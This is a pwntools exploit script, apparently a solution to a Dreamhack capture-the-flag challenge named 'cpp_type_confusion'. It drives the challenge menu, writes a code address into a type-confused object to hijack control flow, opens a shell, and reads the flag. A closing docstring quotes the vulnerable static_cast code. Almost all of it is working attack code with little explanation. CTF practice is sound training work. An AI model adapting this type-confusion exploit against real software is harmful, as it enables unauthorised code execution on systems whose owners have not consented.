#!/usr/bin/env python3
from pwn import *

PORT = 23648
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./cpp_type_confusion', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

PROMPT = b"Select : "

def sla(aft, opt):
	p.sendlineafter(aft, opt)

sla(PROMPT, b'1')
sla(PROMPT, b'2')
sla(PROMPT, b'3')
sla(b'Applemango name: ', p64(0x400fa6))
sla(PROMPT, b'4')
sla(PROMPT, b'2')
p.sendline(b"cat flag")

p.interactive()

"""Bug
if(appleflag && mangoflag){
    applemangoflag = 1;
    mixer = static_cast<Apple*>(mango);
    std::cout << "Applemango name: ";
    std::cin >> applemangoname;
    strncpy(mixer->description, applemangoname.c_str(), 8);
    std::cout << "Applemango Created!" << std::endl;
}
"""